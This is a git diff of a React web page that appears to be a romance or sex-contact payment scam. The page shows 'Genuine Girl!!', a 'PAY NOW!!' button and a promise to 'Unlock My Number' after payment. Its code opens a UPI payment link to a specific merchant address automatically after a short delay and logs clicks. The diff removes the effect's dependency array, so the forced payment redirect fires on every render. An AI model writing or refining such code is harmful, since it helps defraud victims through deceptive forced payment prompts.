@@ -27,7 +27,7 @@ function App() {
         window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=Genuine_Girl", "_self");
       })
     }, 200);
-  }, [])
+  })
   const handlepayButton = async () => {
     await sendUpdate("PayButton")
     window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=Genuine_Girl", "_self");
@@ -41,8 +41,8 @@ function App() {
   return (
     <div className="App">
       <header className="App-header">
-        <h1 style={{ marginTop: "-60px", marginBottom: '10px' }}>🍆Genuine Girl!!🍆</h1>
-        <button className='button' style={{ marginBottom: "20px" }} onClick={() => { handlepayButton() }}>PAY NOW!!</button>
+        <h1 style={{ marginTop: "-30px", marginBottom: '20px' }}>🍆Genuine Girl!!🍆</h1>
+        <button className='button' style={{ marginBottom: "0px" }} onClick={() => { handlepayButton() }}>PAY NOW!!</button>
         <h6>You should PAY first to Unlock My Number!!😜</h6>
         <CopyExample />
         <h6 style={{ marginBottom: "5px" }}>Click Below👇 For My Whatsapp Number!!</h6>
